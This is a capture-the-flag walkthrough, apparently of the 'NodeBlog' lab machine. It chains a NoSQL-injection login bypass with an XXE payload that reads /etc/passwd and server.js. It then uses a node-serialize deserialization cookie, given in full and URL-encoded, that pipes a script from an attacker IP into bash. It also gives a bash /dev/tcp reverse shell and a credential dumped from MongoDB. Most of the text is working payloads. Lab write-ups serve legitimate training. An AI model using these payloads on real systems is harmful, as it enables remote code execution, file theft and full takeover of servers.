# nmap 
## nmap all ports
![](nmap%20%20all%20ports.png)

## nmap services and versions
![](nmap%20services%20and%20versions.png)

# domain
## main page
![](main%20page.png)

# login
## invalid username
![](login%20invalid%20username.png)

## valid username: admin
![](login%20valid%20username.png)

# burp login intercept
![](burp%20login.png)
## nosqli payload in burp --> bypass login
![](burp%20nosqli%20login%20bypass.png)

## login dashboard
![](domain%20login%20dashboard.png)

## wrong payload --> error messages --> new endpoint
##  burp request
![](burp%20request.png)

## burp response
![](burp%20response.png)
## new path:
### paths cant be accesed
````
/opt/blog/node_modules/raw-body/index.js
/opt/blog/node_modules/body-parser/lib/types/json.js
````

## common nodejs files
![](root%20path.png)

## XXE file upload
````
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
 <post>
 <title> Post</title>
 <description>desc</description>
 <markdown>&file;</markdown>
 </post>

`````

## XXE succesfull
![](XXE%20succusfull.png)

## read /opt/blog/server.js
````
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///opt/blog/server.js">
]>
 <post>
 <title> Post</title>
 <description>desc</description>
 <markdown>&file;</markdown>
 </post>

`````

## server.js file succesfull
![](succesfull%20read%20server.js.png)

## server.js snippet
![](server.js%20snippet.png)

## node-serialize vulnerability search
![](search%20for%20node-serialize.png)

![](node-serialize%20rce.png)

## node-serialize payload
![](node-serialize%20payload%20raw.png)

![](node-serialize%20IIFE%20to%20rce.png)

## final payload
````
Cookie: auth={"user":{"$ne":null},"sign":"4b7029c2a4ed7527255315fc356bf082", "hello": "_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"nc 10.10.14.5 9001\", function(error, stdout, stderr) { console.log(stdout) });}()"}

Cookie: auth={"user":"admin","sign":"4b7029c2a4ed7527255315fc356bf082", "hello": "_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"nc 10.10.14.5 9001\", function(error, stdout, stderr) { console.log(stdout) });}()"}

Cookie: auth={"user":{"$ne":null},"sign":"4b7029c2a4ed7527255315fc356bf082", "hello": "_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"curl 10.10.14.5:5000 | bash\", function(error, stdout, stderr) { console.log(stdout) });}()"}


`````

## burp send final payload url encoded
![](burp%20succesful%20payload.png)

## cookie test payload url encoded
````
%7b%22%75%73%65%72%22%3a%7b%22%24%6e%65%22%3a%6e%75%6c%6c%7d%2c%22%73%69%67%6e%22%3a%22%34%62%37%30%32%39%63%32%61%34%65%64%37%35%32%37%32%35%35%33%31%35%66%63%33%35%36%62%66%30%38%32%22%2c%20%22%68%65%6c%6c%6f%22%3a%20%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%5c%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%5c%22%29%2e%65%78%65%63%28%5c%22%6e%63%20%31%30%2e%31%30%2e%31%34%2e%35%20%39%30%30%31%5c%22%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d


`````

## cookie reverse shell url encoded
````
%7b%22%75%73%65%72%22%3a%7b%22%24%6e%65%22%3a%6e%75%6c%6c%7d%2c%22%73%69%67%6e%22%3a%22%34%62%37%30%32%39%63%32%61%34%65%64%37%35%32%37%32%35%35%33%31%35%66%63%33%35%36%62%66%30%38%32%22%2c%20%22%68%65%6c%6c%6f%22%3a%20%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%5c%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%5c%22%29%2e%65%78%65%63%28%5c%22%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%35%3a%35%30%30%30%20%7c%20%62%61%73%68%5c%22%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d

`````

## succesfull shell
![](admin%20shell.png)
## payload
````
Cookie: auth=%7b%22%75%73%65%72%22%3a%7b%22%24%6e%65%22%3a%6e%75%6c%6c%7d%2c%22%73%69%67%6e%22%3a%22%34%62%37%30%32%39%63%32%61%34%65%64%37%35%32%37%32%35%35%33%31%35%66%63%33%35%36%62%66%30%38%32%22%2c%20%22%68%65%6c%6c%6f%22%3a%20%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%5c%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%5c%22%29%2e%65%78%65%63%28%5c%22%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%35%3a%38%30%30%30%20%7c%20%62%61%73%68%5c%22%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d

Cookie: auth={"user":{"$ne":null},"sign":"4b7029c2a4ed7527255315fc356bf082", "hello": "_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"curl 10.10.14.5:8000 | bash\", function(error, stdout, stderr) { console.log(stdout) });}()"}





`````

## serve malicious index.html file
````
bash -i >& /dev/tcp/10.10.14.5/1111 0>&1

`````

## user.txt
![](admin%20folder%20permission%20denied.png)

## mongodb database
![](server.js%20mongodb%20path.png)
![](dump%20mongodb%20database.png)

## mongodump
![](mongodump%20result.png)

### creds
````
admin:IppsecSaysPleaseSubscribe

`````

## root shell
![](NodeBlog/screenshots/root%20shell.png)

XXXXXXXXX